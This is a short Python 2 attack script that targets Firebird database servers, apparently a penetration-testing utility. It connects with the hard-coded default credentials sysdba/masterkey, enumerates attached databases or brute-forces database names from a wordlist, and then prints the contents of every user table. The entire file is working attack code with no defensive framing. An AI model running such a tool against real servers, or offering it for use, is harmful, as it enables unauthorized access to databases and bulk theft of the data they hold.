try:
        import firebirdsql,sys
except:
        print "Download pyfirebirdsql from https://github.com/nakagami/pyfirebirdsql.git"
import argparse
import sys

def extractDB(database,ipAddr):
	con = firebirdsql.connect(
  		host=ipAddr, database=database,
    		user='sysdba', password='masterkey'
	)
	cur = con.cursor()
	cur.execute("select rdb$relation_name from rdb$relations where rdb$view_blr is null and (rdb$system_flag is null or rdb$system_flag = 0);")
	results = cur.fetchall()
	print "\n- Found the below tables"
	for x in results:
		print x[0]

	for x in results:
		print "\n- Extracing the contents from the table: "+x[0]
		cur.execute("select * from "+x[0]+";")
		results = cur.fetchall()
		print results

def connectFirebird(ipAddr,wordList):
	defaultDB="C:\\PROGRAM FILES\\FIREBIRD\\FIREBIRD_2_5\\EXAMPLES\\EMPBUILD\\EMPLOYEE.FDB"

	#Try getting list of connected databases without attempting any database name guess.
	con = firebirdsql.services.connect(host=ipAddr, user='sysdba', password='masterkey')
	results = con.getAttachedDatabaseNames()
	dbList=[]
	if len(results)>0:
		for x in results:
			if x!=defaultDB:
				#Remove the default database
				dbList.append(x)
		print "\n- Found the below connected databases"
		for x in dbList:
			print x
		for x in dbList:
			print "\n- Extracting contents from Firebird database: "+x		
			extractDB(x,ipAddr)
	else:
		#Brutefoorce firebird databasess
		print "\n- Bruteforcing Firebird database names"
		dictList=[]
		with open(wordList) as f:
    			dictList = f.read().splitlines()
		currentWord=""
		for word in dictList:
			currentWord=word
			try:
				con = firebirdsql.connect(
   					host=ipAddr, database=word,
    					user='sysdba', password='masterkey'
				)
				print "Correct database name: "+word
				break
			except firebirdsql.OperationalError:
				print "Incorrect database name: "+word
				continue	
		extractDB(currentWord,ipAddr)

if __name__ == '__main__':
	print "This tool attempts to brute force the database names on the Firebird database server using the default credentials (sysdba|masterkey)"
 	parser = argparse.ArgumentParser()
    	parser.add_argument('-host', dest='ipAddr',  action='store', help='[IP address of Firebird database server]')
    	parser.add_argument('-wordlist', dest='wordList',  action='store', help='[File containing list of database names to brute force]')

    	if len(sys.argv)==1:
        	parser.print_help()
        	sys.exit(1)
	options = parser.parse_args()
   	if options.ipAddr:
		connectFirebird(options.ipAddr,options.wordList)
